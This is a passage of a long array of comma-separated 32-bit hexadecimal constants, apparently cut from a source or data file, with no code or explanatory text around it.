daba56f,0x3e3f9659,0x120885fc,0xa7886659,0x0395d0e0,0x2d6d5ef4,0xa016ad92,0x2f0afe77,0x45c7f2b4,0x93afefdd,0x284b319c,0xab051749,0x961b2d03,0x01f4b1d3,0x68c916a0,0x4aa9e933,0x6e690964,0x19b9dfb8,0x15f8e302,0xa756fe10,0x8b4c04b9,0x4fc77b4c,0x9c3918f7,0x6ebb4dd1,0xc27494ee,0xa721ab7f,0xf235a1cc,0x14c045e5,0xc357b556,0xba6fed5d,0xc96277a4,0x15aad2cd,0xa4587dcf,0xc327e937,0x161241f2,0x4d6c2580,0x5e02d39c,0xd60ba97c,0xcdfa77d5,0x85d4ca6c,0x1c9cf636,0x95a25418,0xad205195,0x6aeb8381,0x87855442,0xe75f5b74,0x2fa1af94,0x3ca19bfa,0xa72f7b15,0x393a9537,0xf6ee33ad,0xdb65e706,0x5fba38c9,0x5766ecee,0x4bf3f16a,0xad75d73a,0x48917e3c,0x43540390,0xb2bfdfd3,0xd95e78da,0x7ea56d2d,0xe8fe4e35,0xb922bce1,0xddd4190a,0x79b3deef,0xec97c9f0,0x6e0a2264,0x600ed07d,0x0c5db56b,0x56ad67bc,0x3b7b20ac,0xc81acdec,0xb209122c,0xcd45ceb2,0xde71d65b,0x8a2c28dd,0x4e83587c,0x04a35814,0x64fe675d,0xfb8df5cd,0xfc1d5527,0x8634ffbf,0x1497d30a,0x59ce85d7,0x19446feb,0x57fe18e1,0x8a9cde1d,0x61d64418,0x30b1c9bb,0x1323ac0c,0x244a32ec,0x76b66933,0x3be5813f,0x92726f85,0x1d55f305,0xd42bf87b,0x08e46868,0xc8d89a2f,0x43d53552,0x5be3b357,0x9519d831,0x0c063307,0x8de75bdb,0xa8f3981f,0xaccf8739,0xac05429c,0xd411e771,0x1b0e7fcc,0xd49ede3f,0x0618146a,0x5fe998ab,0xab23b642,0x19f0308a,0xbbeea6f3,0xd3b24fd3,0x4d2f43d8,0xa707db3e,0x3a32a054,0x3a7231ba,0xd5982837,0x77944bd9,0x15a84fb9,0x4e40f3d3,0x4e650afc,0x421f5c9b,0x9141dc7f,0xc7e37b39,0xcc6414f9,0x38e2b4a0,0xd661063c,0xa4ca9a7b,0x30f1abb8,0x81e0b4dc,0x4c7b9ffb,0x76ac29f6,0x4eb18872,0xd6a167f3,0x0e749b67,0x8e76d3f1,0xabb99a6e,0x76929d2e,0x12b094d4,0x2313d324,0x782eb5e2,0x72ff05a6,0x02bf3677,0x04e4f109,0xcbb1fcfa,0x16c50f6a,0x1ecff429,0x72f9f964,0xf466eac2,0x6338dfbb,0x66ace095,0x68a39f9e,0xea3b9f89,0x4b2a4c07,0x0748d421,0x1cfd90f4,0x17e4e1ae,0x7f5b633e,0xb65a7755,0x6adbf509,0xfd181fcd,0x01b7e41f,0x6fe949fe,0x7922b7ed,0x9d8c153e,0xdc4d2443,0xe83d44ed,0x011ae50f,0x52fce4a6,0xa35a2597,0xa4acf669,0x21e94901,0x97e39bcc,0xa6077944,0x32d7aa02,0xd846e38e,0x21f2d00c,0x9eed5ae2,0xf3565833,0x565331df,0xce1b6252,0xfb4d96f5,0xdc10ad57,0x82c2d168,0x9f117f8c,0x98c60f3a,0xca3f01f1,0xb1676794,0x5ce98a2c,0x8c396ba5,0x76cdd4cf,0x5abb932a,0x7a3aad2d,0xe964d95a,0x32881209,0xab2b3771,0x132c9165,0x83e312e4,0x5ca26a90,0x5e261dd3,0x203292c9,0x3be75205,0x849204ae,0x60b08080,0xb63da8f8,0x16baa8b9,0x08a62b26,0x59af6d8b,0x801e9d0f,0x37128a12,0xed10bfa6,0x1561b89d,0x3084e13c,0x903735a6,0xd845998e,0x9ce84f31,0x19f8601f,0xe779ff0f,0xf8757e0f,0x83b7c5d9,0x9defee0a,0x38db6875,0x6f08bfb3,0x41374861,0x3823caf3,0xefc972a3,0x50956665,0xca953659,0x8677d5c6,0x0fc0892f,0x60c6d48f,0x2860d6d3,0xc77a7af1,0x0f73f84a,0x76466228,0x9438b1ae,0x0ac156b1,0x7e4a2e96,0xfc9f51c5,0xca11108a,0x3b65e5df,0xa6250d5e,0x6120a614,0xfc861fa6,0x7a71fcc2,0x62508ea1,0x67fd0911,0x55e7e90d,0xa2438554,0xbd3870b5,0xdd028f58,0xd33cade2,0x14d53113,0x6b0d2221,0xbf470eb3,0xc9da53d0,0x0ee69960,0xd1a35b6e,0x95a50e9a,0x301c8210,0x7fa278fd,0x78f00a08,0x3b42653a,0xca0b456e,0x94e8564e,0xb077fc4c,0xa44bd6a3,0xac57a981,0x9ff552b1,0x86de909c,0x3e0e8e85,0xf33a5cc0,0x6d462487,0x819a353d,0x415c03f1,0x6480935d,0x190cf016,0x1c81f372,0x82d7a155,0xe75d6a21,0xb7828e63,0x305c40b0,0x39e7d475,0xe6460be2,0x3ccd9f5e,0x2aa2e7df,0x9c4a817c,0xdd0bc90e,0x5229be15,0x44b5526b,0xea144c30,0x489cbd21,0x828a17c8,0x903f3390,0xa5310e45,0xe25c0c15,0x7e342c52,0xd79ca789,0x5d3d2fd3,0x0cdd15be,0x35262f6a,0xa480e26a,0xc4006683,0xd23dfc03,0x428b6553,0x00b14302,0x9ed80afd,0x8a30576f,0x986dfec0,0xead801c6,0x233c842c,0x1576cf39,0xec72a134,0x2a478818,0x299ee0a9,0x79639505,0x29f677b0,0x61fc268f,0x82fa3cf2,0x7e306b29,0x771f0b93,0xbc200b69,0xf67b453f,0x3b0a4aed,0xe8a77822,0xf65b4ccd,0x3098b536,0x127283a6,0x6387b511,0x60d3632d,0x7799a464,0xf34dd320,0xd0c46907,0xdd9408af,0x6cc70871,0xf7d91a20,0x0fdc1520,0x6fc54f79,0x5a1c39f1,0xd1d4d028,0x478aa7c5,0x37875fc1,0xd6e2500e,0x5d6f4630,0x0f768df9,0xa44fec28,0x514b37e4,0xe40c7fcb,0x5583cbf7,0x76140949,0xa270613c,0xb055ccf1,0xd62285c0,0x03f8bb56,0x69f2ddd7,0x9710692e,0x7d355c7d,0xc95a2fcf,0x325da92d,0x7c6b7aa8,0xc25a88d1,0xba982695,0x1e96b053,0xe64dd285,0x8ea74ca5,0xf0a0372b,0x991c2140,0x0045605d,0xd4939e3d,0xf3f9df97,0x1622fd53,0x6d34e6e9,0x47d38bed,0x06aee4bc,0x4154e17c,0x7d9a70bb,0xe16ca298,0x98a66f1a,0xb0918bc2,0x241ada39,0xc7259a6c,0xf2239e14,0x56a6fa1e,0xaecb5763,0xf33baef1,0xe8415b29,0x68d4e24e,0x1fa77643,0x0c8e6b66,0xabf5b064,0x5c62b911,0x04e0552e,0xaa4d6eca,0x9f3bda09,0x8524dc30,0xb41b3759,0xaca93407,0xb3438c0e,0x8cbc5df3,0x99084c0d,0xd7468d98,0xe257416b,0x4193777d,0xcd647ee4,0xf7c85333,0x04a63f46,0xd8f485c9,0xb7215896,0x8a420cc9,0xca369a63,0xcc0c9d66,0x711ff011,0xbaeec78d,0xad3fd94b,0x397272b5,0x7adf2fba,0xacca8be5,0xca28af6a,0x8810e47d,0xc5566adc,0x38fd5c8b,0x32978cbf,0x403d9cbe,0x192b7cbd,0x4aff93c7,0x2d625ddd,0x1c44ee66,0xe41cc496,0x6f26e4ec,0xe9b30e87,0xf3cee655,0xac3500f4,0xcc897b34,0xaa81051b,0xdb417f5d,0xff83957b,0x31113994,0x4bfbc40c,0x2ac26c21,0x51408b9b,0xcc8b61d5,0x20702b4b,0xf14a12e0,0x69f97e7e,0x4b2891d1,0x1b3688a1,0x107e3730,0xa28fcd6f,0x96a50b7c,0x71968b13,0xfb288333,0xec9d0255,0x745d09c2,0xf1d00c31,0x3cdc4e41,0x51e220b5,0x62b73fab,0x75010a58,0x2b5945a9,0x7b0307a7,0xd96b7862,0x2c9e9cfb,0xc013e1a2,0xb075c7e7,0x73e5774a,0xa7d07b79,0x57eed87c,0x6e027e4e,0x2f5455bc,0xb9df31b0,0x0618da04,0xb1d27caf,0x1274b1cd,0xc8289012,0xd2a3f822,0x1c5fe834,0x025f99e9,0xdbd98c26,0x8676e586,0xa3f706af,0x18395aa7,0x0b9703ca,0x84af1386,0x755b693f,0xd74909b2,0xa5df2127,0x2892d0c1,0x5916197e,0xeb091d95,0x86906bd3,0x48b44f44,0x3deb3f23,0x4115a4ab,0xd6a4d62c,0xe4a152c8,0x10f73132,0x8e8f803a,0x55ff07e3,0x96b0f437,0x647f5b52,0x792dfd98,0x59519945,0x2240d0a0,0xd1b733f0,0x137fd06e,0xdf8c8689,0x0928ed30,0xd43a8e82,0x0449ae9a,0x6f068dda,0x4ad40b6a,0x2df5ec09,0x200ac0a4,0x64be1282,0xcdca26a5,0xe83f3e93,0x96efa2e1,0x3ac31aa1,0x37536b8f,0x5dd3e4df,0x73ce4c81,0xe64c0414,0xa6be8a39,0x19a2beb7,0x57bb3861,0x3fc3e20e,0x7abb1ce6,0xd4668cfc,0x1d11235a,0xa985ee50,0xd376646e,0x4f1894c7,0x6cfdcd01,0xe7dcbdc7,0x18eb1468,0x8f1efd65,0x425eba1c,0x2c9f7647,0xba7df796,0x3da8337d,0x0c276603,0x7152019d,0x6037f2d1,0xedbca1ef,0x9ee40089,0xee6a1019,0xd2355fc1,0x37ac7ab5,0x6a47da89,0x17164a82,0x0dfb03c7,0xb2a6ee35,0x798dac93,0x7dacbd40,0xa56cb126,0x953b0d79,0x67559f98,0x4e060ecd,0x49da01a8,0x51b34f36,0x3353b80d,0xf58df4fc,0xde9c49d2,0x48c18162,0x870c3978,0xf197445e,0xc6fdd419,0xabf47689,0xe2470bc6,0x5f705c11,0x2cdde8a8,0xa1e528d6,0xfc0d9a9c,0x4bdf44ac,0x4586060d,0xa68f35e7,0xb490f2df,0x2f73bcd8,0xf739947c,0x337c3340,0x75c73801,0x882fee29,0xaded621e,0x911379f7,0xe3c87a14,0x298ef110,0x550734ed,0x98cce4b2,0x8748895e,0x029457e8,0x0a01d11a,0x6fb26449,0xc638a14d,0xc01df8d5,0x54c49457,0xa216492d,0xa74d2dc5,0x20489dd1,0x3907786b,0x05a95f9f,0x7904806f,0xec99785c,0xe6446b10,0xf6176483,0xcd59d5a1,0x3fe8859b,0x9ab64d2c,0x0ed9a540,0xd1468b65,0x8f05bdaa,0xa3eed8a3,0xf70eafdb,0xc5b63502,0xddb8f613,0x809ee134,0x1bcb734c,0x0ba4b8c9,0x9252ccd7,0xebde0b3b,0x04da66a0,0xc7fda1bc,0x35a4b861,0xf0e982ee,0x6fd9a7e5,0xf7a0fdcc,0x62b4d565,0x4debcada,0x94cbe93b,0x54c4ba1d,0xf5528bd5,0x0b3a7aab,0x5fb43762,0x6c239e2a,0x51fc782d,0x5d14a7cc,0xd7cc7481,0x33c034c0,0x74828274,0x13a19e96,0x2334cf89,0x11458a51,0xae03d9da,0xdf23e276,0x2a9a3dcc,0xeb75870a,0xf044388c,0xcd0b805b,0x57f5c7bf,0x53ca5720,0x7229be3f,0x009a4ba4,0x6888baf6,0xc3f40994,0xe5118595,0x09da8d2a,0x92d13d41,0xe1197741,0x22022959,0xe06fc142,0xcf76b087,0x11ae3f3f,0x3ff4169f,0x69902a77,0x7a97b78b,0xe9c69c58,0x7c12a48e,0xf07b5d57,0x9347771d,0x702af656,0x37ec0965,0x0ce4fea0,0x5afc265d,0x18c9b226,0xe8153b50,0x209ce6f5,0xb146109c,0x9a772c00,0x903aae9f,0x09a166a6,0x8f964832,0xda119c0c,0x2179d2cb,0x83ce9844,0x3cfeda2a,0x285e82d2,0xf2977461,0x949a1743,0x00b1bd55,0x566b31fd,0x38c330d2,0x987cddcf,0x3a114ff9,0x286c294d,0x6e638aa7,0x8495c375,0x8595d3d3,0x07744983,0xf853b29b,0x4a53a7c1,0x78abc8c2,0xf7873f17,0x381cfadb,0x8fc144c9,0x50204e2c,0xa538f6b4,0xa24d36e7,0x82898d77,0xf376eb9a,0x594b613d,0xfd2952c8,0x30edcde1,0xe7e98ebc,0x9dc72e9b,0x7a3abe55,0x74d8b67b,0x2a8fecee,0xff8ffbbd,0x03d62b75,0x7a43da88,0x5bcd544f,0x8eae485d,0xb63ab2cc,0x6f9e8850,0xc415cab9,0x4ba40a87,0xf66ab3ac,0x96ade5ff,0x56e8ad83,0x8d8313af,0x7a7a0779,0x953bc9ea,0x930d491a,0x8b5a36f7,0x2b63538e,0x8dcd5d7e,0xd237d26c,0xb2575161,0xaf16eefe,0x02de4576,0xe7686e47,0xf0a40b52,0x7d1be8e2,0x3960b1e0,0xa08ca288,0xfee97fa8,0x323e8039,0xc771ee97,0xc779564d,0xc7a5daef,0x3b1b3c38,0x426aa6a4,0x7702127d,0xc7fb85be,0xca80cb86,0xe5cd4c79,0xf0b7ed2e,0x7d2dd070,0xceeef68d,0x28e7d2cf,0x35d0e881,0x939b55a4,0x696f7f0d,0xf4f66559,0xdaaef26c,0x2a0cd04a,0x4cd98913,0xe8a34424,0x66ec65ef,0x493ed23b,0xa18eee18,0xc9b333a4,0x193deaf1,0x1319661c,0xd1a09f86,0x7b36d2d8,0xc6ef2c96,0x8dc37d0c,0xd7656212,0xdeffe85b,0x601e82c8,0x448fc653,0x1a79e821,0x427ed8c5,0x873e30a2,0xb5a79601,0xb80f0c29,0x4e97e775,0x215a0c36,0x18bf0156,0x37596d8a,0x6b7e0df4,0x5773ac4e,0xc1bbb7d5,0x6438ed7d,0x06f9c3db,0x879d3cba,0x2d843931,0x9584ac7c,0x11cdc28a,0xe480d977,0x59a4c578,0x390d402b,0x4c7f51a4,0xdc1fc136,0x85985df9,0x2605d98d,0xeae10727,0xdd89309e,0x047413d3,0x4429ac23,0x3511f92b,0x324e3d3e,0xfcd9b1d4,0x3b59546a,0x08c53168,0x9acf54a0,0x6cbe30fd,0xb3e0c713,0xf8c5da68,0x05b4c67a,0x0f2dc2a7,0x6596c02c,0x6b7705ae,0x6d50085e,0xf3728826,0x018cd69d,0xa1dfbdfc,0x765475fd,0x78e0254d,0x048a8cd6,0x6afa76ed,0x070adc80,0xf8131366,0x76d20d31,0x1c826a6d,0xb32ebd79,0xdc6701a6,0x251f28c4,0x749cfd00,0x45f0abb0,0x02dd5647,0x6ed555ab,0x128d990b,0x3d91a7b8,0x86ba6808,0x3f1c69e3,0x75fda116,0xe163fcb9,0x5741a9b6,0x75401571,0x850a4bb7,0xd3555f85,0x6c6b2b71,0x132a1651,0x07aebc21,0x45023fa1,0x7662dfba,0x20202770,0x8e2db20f,0x227f6962,0xe0838ebe,0xb3a4fcda,0x21516dd7,0xfff785fb,0x28fc0789,0xcaa45832,0xdb9e8aa1,0x7c473474,0xd63bc9a9,0x28681585,0x52c953e4,0xcfb46874,0x2a5a7aca,0x883b7b6b,0x82be2ce6,0x4f004c04,0xb216f6aa,0xe826fdd0,0xc436e9d5,0x3776346a,0x18a7b89b,0xb0898e88,0xc5ca0cde,0x3a76362b,0x710b7fa7,0x410bc3f4,0xf1189dab,0x64b3fe4b,0xf94f704a,0x9dd2cb27,0x1f25c32d,0xd2702818,0x841b219c,0x875e1f77,0xaa2ed98c,0x2096bbcb,0xbd334c6e,0xb0b1085b,0x7afd6d4d,0xdc993f07,0x2de3a6c8,0xd798a2cf,0x26dd9220,0x39199a8d,0x10dba3f3,0xabee21d3,0x3b39f9cf,0xb99774bc,0xe324a013,0x9a62ef57,0x8781265b,0x0cfbdfca,0x375f1282,0x546e89a7,0xa95bbc1a,0x15c727ce,0x7aa048cb,0x33050416,0xce67c38b,0x2f34dfe8,0xbb8b3218,0x5521a4e0,0x9e4a11e8,0x372604af,0x92368532,0x5d398c92,0x6cb6b933,0xfc273090,0xd4520643,0x4ed9d821,0xfc74ce88,0x3ae2ad97,0xf9a53cff,0xac6b0e1e,0x56701a1e,0x6d0cd542,0xe02bbde2,0x4ac3eb7e,0x0a08982f,0x281508f9,0x2d9bb28e,0xa160eeed,0x05bef50e,0x5ada7a41,0xdd5d4649,0x53881290,0x8966904f,0x5c7db225,0x859a8d65,0x3d356d13,0xb661eeca,0x210896fe,0xea8082dd,0xdfc7279f,0x43e09790,0xd1ec5d4f,0x60f4e758,0xc354f437,0x60ba3c14,0xc90e0e56,0x87dabff0,0x8af462d6,0x18b0c68d,0x197c57bc,0xe7ddb9f6,0xbc71798e,0x74248c5a,0x4da0d60d,0xa5b89f6f,0xeb0705a7,0xbcf8ea71,0x1ce69b36,0x8866a860,0xaf6e5f50,0x3b07186a,0x86ceb0e6,0xd9a4a7b1,0x63671c6a,0xe9148d8d,0x353fe03e,0x4c7a4683,0x518ebb83,0x81f22b92,0xf9cbd09b,0xf3e933ef,0xeecfb6cd,0xb125622d,0x1ecc973a,0x92035a3c,0xeb4dc1f4,0x093c5d47,0xff847995,0xf743f603,0x194c94c1,0xf2b8a02c,0xb9e638db,0x6df648f6,0x424b49d2,0x6d53c54a,0xb21a8569,0x92bcb000,0xa2650ae2,0xf485960c,0x201dff0b,0x036c7ecf,0xd682eefa,0xfa2e0bf4,0x153e1e7b,0xb35fb467,0x7ce10635,0xf850c2d7,0x07eeb01a,0xadf741a6,0xb84658dc,0x8bb32213,0xb44e3b65,0xc1400f07,0xdb61d2aa,0x34ee0eec,0x5932d236,0x07f4fb22,0x95663cda,0x0230b94f,0x36f9dc3a,0x50ec45b3,0xc47b0a06,0x0ee4fb98,0xda51bc32,0x8952b680,0x4582a0f5,0x5c148644,0x5eeeab62,0x936559bd,0xc249299d,0xf96f691d,0x0b3967fe,0x12dcf109,0x8fefb929,0x7062a6fb,0xf2efadf4,0x4700cfa8,0xc7565ed5,0x5a7a4cfc,0x70f6d390,0xc3cdf0c0,0x65743303,0xb51743bd,0x63ce628f,0xff09e4f6,0xce014428,0xd686c2eb,0x667c5e3a,0x4610e4d7,0x254d9eea,0xba668087,0x70b8d913,0xd6524860,0x36422f3a,0x80e63e6a,0x7c14854b,0xc9f422b6,0x5b09c875,0x9a532de7,0xed7fe04e,0x59d8bdbe,0xc46c4eb6,0x35a42232,0x84abd87e,0xa74f992b,0xb521079b,0x03dc45fd,0x2c7cf566,0xe6ac4a4d,0xe0aae407,0xbe9c6707,0x228db9f2,0xf5fc1338,0x2f1e03d0,0x8b3625a5,0xd22ba850,0x9f45c730,0x6420445e,0x87f97849,0xdedddcb5,0xcb4a9ca8,0xe61d5145,0xd79ab05d,0x9a46aa67,0x6dd112f9,0xc203cec9,0x28b1d9f7,0xfed8a425,0x3629dd55,0xc4694f28,0x6789e2d5,0x095935f2,0xdffe2055,0x3fbb84ef,0x5be1b143,0x3fb0ff91,0xb6e6e2c8,0xd389efe2,0x3f365445,0x33b1a05f,0xcc27f724,0xb0767dc8,0x14bf8eb2,0x4879362d,0xfd187c3c,0x5aa15f45,0x50f8e32a,0x5ef33902,0x479b408c,0xb914ca5e,0x9ce5f569,0xf91c2a87,0x699f6b76,0x2c16a5a9,0x019d1b57,0x857a4088,0xdd7719f2,0x480c80f7,0x598f4f5c,0x7bbd5534,0xdb40a1f7,0x24029e5d,0xd3b94862,0x86ff9788,0x77ff99f3,0xd503b260,0x6b704458,0x1b15bdb2,0x11baa310,0xe22366a0,0x08edc538,0x1be41e88,0x6a5cf808,0xb926c419,0x2e2ad4b6,0xf27be0a5,0x69b20550,0xc1bedca8,0x17f73f26,0x1713b715,0x3d45e1dc,0x2bc10ae0,0x0b9cf681,0x1e40b622,0x709ecae6,0xc24a8c47,0x3a220c8d,0x8ae1a36a,0x104a403f,0x3cd8de7a,0x97c774de,0x898baf6d,0xa20f95ac,0xf265d42c,0xa9a6c850,0x42914827,0xd993e810,0xc2623ea7,0x591ac539,0x1f95ee3e,0x22b9feed,0xb2524940,0xa733c791,0x8fdd6283,0xc9b1a603,0xc9cb6082,0x8b0a8411,0x6b981077,0x40eabf21,0x759af82c,0x5982cef0,0x23c8bd4e,0xd46c71b1,0xa1702c40,0x768abebf,0x1c4d174d,0xd3905cff,0x0d735ce3,0x2ea4e7d0,0x26709556,0x95f8abdc,0x0f040030,0xda265081,0xee50f846,0x30500769,0x08e33ee6,0xb77641ad,0x9e0d58cb,0x41a4cfca,0x4386ff2e,0x9c5eb75e,0xc31f8270,0x847d4cdf,0x7a32b6df,0xcce000d5,0x2a8838e7,0xf0c22a61,0x99dd6eae,0x0fdd3680,0xeea2629d,0xbefce82f,0x97b89712,0x915ea48d,0x72730286,0xc837bd28,0x2b9cae1e,0x5b2be06f,0x3d18114a,0xb157fff3,0x61f1c579,0xdaf3ac12,0xe78ba01d,0xc99ea150,0x8282ce07,0x603e9aa7,0x6b340aad,0x8656fca9,0x1ee48e82,0x732ad9f3,0x91d31eaf,0xbca32788,0xa257b3f9,0x459b917f,0x5ca0ca80,0x4cb2bfd6,0x3b36f695,0xc80995ce,0x6c2fae91,0x8a8ad4e6,0xbed0695d,0xcc8cb167,0x50e4e2fb,0xda1fb5bc,0x64d0a956,0x441cea00,0xa291f9ba,0x1de04845,0x570e3ce8,0xf53f7f76,0x62b866f1,0x85f633a7,0xb5f03dcd,0x801db169,0x719d11bd,0x6199d5dc,0xab68fde2,0xcbe32e24,0xa91a5677,0x4b56a689,0xc5c7e02c,0xba742e66,0x1dddcc17,0x34b2cde4,0x9f913e59,0xde68c2a9,0xd1e3cb49,0x9437a61e,0x8c49085b,0xdfa51eb2,0xd45c25f5,0xc40a3926,0x9c67f35d,0xbe0a6df1,0xafa971e1,0x91f79aa2,0x7b2aa940,0x22313468,0x94ed52e3,0x8f760674,0xf6acc144,0xaa9fd8b8,0xce8ad806,0x77924fab,0x68defc8e,0xfbcd9229,0xfd2cffe6,0xf33035ce,0x024bffc7,0x6218418d,0x6b09f108,0xc0275f4a,0x4f84372f,0x65c6ffdb,0x34d462f6,0x510dd22b,0xa741aa7a,0x3a5c5b7a,0x16f44fa5,0xb9e98847,0xfb544e76,0x971e8314,0x6ee550f4,0x47123a57,0xfc5061b3,0x6a1d5b6b,0x58b8a840,0x84480e1a,0xb2189ab7,0x66f212f3,0x6190b5f7,0x91db208a,0x315b1589,0x3ad88957,0xbf2484c6,0x5e2fc31b,0x35f01352,0x1a87fb2b,0xb04656c3,0x7a7e2288,0x35cced32,0x2407c95b,0x676203d8,0xa3b04d46,0xb3041eb3,0xf8cbce1e,0xf85df400,0x3565c092,0x94e6dca7,0xed92ebe1,0x4c754401,0x425f3206,0x2717a1f5,0x52d65a1a,0x1a06247e,0x3fe3e156,0x5bf90f32,0x0b90098c,0x492bda18,0xb166c2a1,0x0b0c1b60,0x6470f746,0x811e62c3,0x1c33df7c,0xaf5e8417,0xfe4695a9,0x9b81e192,0x325f1867,0x52bac945,0xb02b0252,0x87042106,0x398c0efd,0x3ff13764,0x187cc77d,0x9a1f746a,0x26b7d672,0x62680979,0x4bf9e6ef,0xe2cf8f24,0xc9f79f0f,0x48867e3e,0xd8a57c8b,0xbe185579,0xa6bdcc7c,0x533474c5,0xd2e2e622,0xdc427810,0xbdb3647e,0x838dfe22,0x17200a34,0xb0b63cb8,0x039d97c3,0xf7ab3f86,0x45d68c68,0xac8e9a9c,0x8896d57f,0xe9360afe,0x3ec1c331,0x031560d6,0x1e84a174,0xeb598734,0x65311492,0x71803a86,0x2faac3f7,0x0c45dae2,0xf86caa40,0x6a263b67,0x1d197bdb,0xf0d466f8,0x46f07208,0xf1d3e4b1,0xf083d7b9,0x3cbe5dd6,0x00668e8a,0x1f4e1aa2,0xf0954908,0x5d736560,0xcf5bd743,0x50ea8c5b,0x188b6a76,0x1196082b,0x7b59f192,0x80a57600,0xa1c25c25,0xad5e5e2b,0xca43eb38,0x194f59fe,0xabe006fc,0x9f8bb005,0xf5736cf8,0x790b43a7,0x04cf4034,0xc4f53cf0,0xe0f643e1,0xd3db23b6,0x47e1064d,0x8a5af473,0xcd4dfb8b,0x7b4020e6,0xf1671827,0x84311a6f,0xcef19828,0x10c1ee5f,0x29863bf3,0xb7734e21,0x8feaa8a4,0x763d26f4,0xd4af8a45,0x8bca6060,0xc3beed5c,0x779961bd,0x5c445eaa,0xf3733a7c,0x0463e8e8,0x33b08958,0xf13efd2b,0x71a1da12,0x899231f5,0x60debd41,0x628e1d92,0x864ec180,0xc117cae7,0x1a4a6cf3,0x4a098ebc,0x455af227,0xf9f8a364,0xfa2f90dc,0x800a21ee,0x5786d5af,0x72d9c320,0x41a2d6c4,0xe60b2e83,0x47600796,0x81b9b0f8,0xf56e8a1f,0x3426b21d,0x491e32a3,0x3c0adcdb,0xfa91dd09,0x0f53283c,0xf3f83e42,0x08353f65,0xfe88267f,0x694351c0,0x0a5cf1a7,0x5fcf6a57,0xb7459548,0xcaf61a76,0x75d42b92,0xe2ebce61,0x3588be7b,0x33f1a4ef,0x1d1c7ec3,0x50d5f312,0x562da38c,0x07da46a3,0x06b7d4bf,0x63699e5f,0xed4410b6,0xb39a477c,0x8eebb532,0x44200eef,0xdc758df7,0x097468ac,0x4b383a3b,0xdc2c9894,0x0b744552,0xbc1c6b43,0x6ce2ae9c,0xd83a2129,0x90c5f8fa,0x66ffc24c,0xc7b03a96,0x5dcee129,0x57b43ec4,0x27830d67,0x42aa039e,0x27245f72,0xe6986e64,0x11e6e248,0x56215780,0x05360e5d,0x62bcce90,0x0faf318e,0x0495c3f2,0x81345e18,0x7637114c,0xc238bdfd,0x74695f06,0x79fb13d3,0xd5feb394,0x87998e33,0x8e4d9f5b,0x227de3f4,0xdcea655d,0xab6f9859,0xebdcca06,0xba8a4cdf,0xbb17cfda,0xd6e940bd,0xd449502f,0xf05a0bf7,0x228da10f,0xf0ea71e4,0xb16fdfd9,0xf57e73cb,0x990236b2,0x73f82181,0x9836479f,0x25b7e6ff,0x518180c5,0xcd460f1c,0x145570b4,0xef63307e,0x01507530,0xaa61ae08,0x5fe533bb,0x914eb944,0xfb67a372,0xaaf710a6,0xc431cf8e,0xdaf5d501,0x5d1e9aac,0x6d528936,0xce46dd05,0xd9c2f4f8,0xa91bcd46,0x509dc75a,0xe9b46779,0xec534803,0xe026bd1f,0x6944c1d2,0x70435368,0x10d215cd,0x5dd2ad75,0xb5b81441,0x9862b30e,0x074d0344,0x6e3cafaf,0x2f879ec7,0xe4ea2c3c,0xac50183a,0xcf1da498,0xc58cee48,0x9534c6de,0x008f5c75,0x603ddc7b,0x8fd55102,0xdad2422f,0x7b3dc49f,0xd9a055c7,0x26430575,0xc20f01c3,0xeed5af85,0x2b843cf4,0xf73daa46,0x2b3bf368,0xd8aebd6e,0xbadf3c64,0x7f8624a7,0x92954873,0x18a933d5,0x99d4c784,0x69b1de30,0x2eb7a104,0xa255330f,0x58a690b2,0x83ac24f4,0x4f9d5915,0x340a95e0,0xf8d0383b,0x3c18f346,0x20f86a37,0xc821bdc7,0x1bc41a08,0x6c48f56d,0x501fd1dc,0x759f0716,0xded187fa,0x8456b542,0xad408a4d,0x612c04b8,0x49b53e9b,0x498ad8b5,0xbe731daa,0x28ada687,0x121e9cc4,0x45b37ecf,0xe338d46c,0x7441c933,0x74093c51,0xb50d04a9,0x63e2a826,0x866a2e14,0xcd719e39,0x987732cc,0xb61ca17c,0xc78d1aef,0x5927a0a2,0x77909ab4,0x4ff8cfd9,0xc9f2fd02,0xff4aae84,0xac7e4833,0x7b8247d1,0xc736535d,0x0a33ca81,0x0492144e,0xe400ecbb,0x8e35fc98,0xf147c4b6,0x4290f1a5,0x6e136f05,0x063a836b,0x8becbc50,0x34801d6f,0x5dcb89bd,0x4d43cc20,0x6f9d381e,0x17fdca3c,0xcc370f24,0x2a202a36,0x56706e94,0xf8f12a5f,0x92a39c7c,0x3f279e59,0xdc911b09,0xba01b3ca,0x4f8aedd7,0xe9ecbed6,0x08065592,0xbe907829,0x7d36140a,0x9f61d7f3,0x9cdb725a,0x28411e34,0x647ce50e,0xbc56601c,0xcc321a78,0xe5bfcc2f,0x28ed78c3,0x9ff4fa4a,0xa54944e4,0x2f6d068b,0x7cf69af4,0x3a93505f,0x97e8a8f1,0xd7e81fc5,0xc7748cdd,0xb08c15aa,0x9f39582c,0x9d6c4193,0x2c66b2df,0xf0e7e62f,0xedcd87e1,0xfbde3fd0,0x3e8a70d3,0xabea834d,0xc4c7b661,0x1c01c89c,0xdda007bb,0x2ff56dc2,0xcaf0b594,0x07e45a7f,0x4c9b107d,0x7800f8c3,0xbfdb404f,0x3a2ef163,0x9632d815,0x49b14ebd,0x852d9409,0x867b3f5d,0xbc18fca0,0xcd35d3cb,0x2aa9d521,0x7f40d07f,0xe6418af8,0x2d219eb9,0x0ef6721f,0x1a96eb3d,0x0a1f00ab,0xfc974fb9,0x689ad64c,0xfb16d695,0x3f909c77,0x6e4d4858,0x5de883aa,0x75ab5ae2,0xf576534e,0x2570b225,0xb3565d26,0x1ae829d2,0xaff98d58,0xec356d24,0x273a8d94,0x9e750557,0x52cdc917,0x76ba64df,0x0cfd6a6e,0xf1aadb00,0x8e308ca0,0xb00f10e4,0xf6e625e8,0xfa3a577c,0x84cd9194,0x80deb379,0xb2dd5a18,0xdb96192f,0x42fab209,0x8bd7a51d,0xdc93d629,0x73ccef20,0x7dd14d89,0xb6690d46,0x2a6381a6,0xa5c041c2,0xf3fca6fd,0x093860c6,0x2b2cd8b7,0x2fcc3464,0xf2948d82,0xedbd6340,0xd0324bfc,0x4d20b77e,0xbd65eaa2,0x9ecde4da,0x0245df37,0x9c56c89b,0x6cb79c24,0xeb7a1b39,0xc5efaade,0x9a0598f5,0xa50d3fdd,0x3cb5133b,0xbd83e365,0x152e07e3,0xf03a961a,0x926a2e96,0x4bb24856,0x86b9e8ae,0xee505886,0xb84e18dc,0x0572ad2f,0x89af8d53,0x54ce5993,0x839d2afe,0xd9e996d0,0xc06bb476,0x9425e7dc,0xd833c57f,0x48525647,0xcfdfddf0,0x9b57c66e,0xf7d56c18,0xbee05be8,0x9fcc9396,0x5a0063b5,0xb7449f8b,0xe9bb38a4,0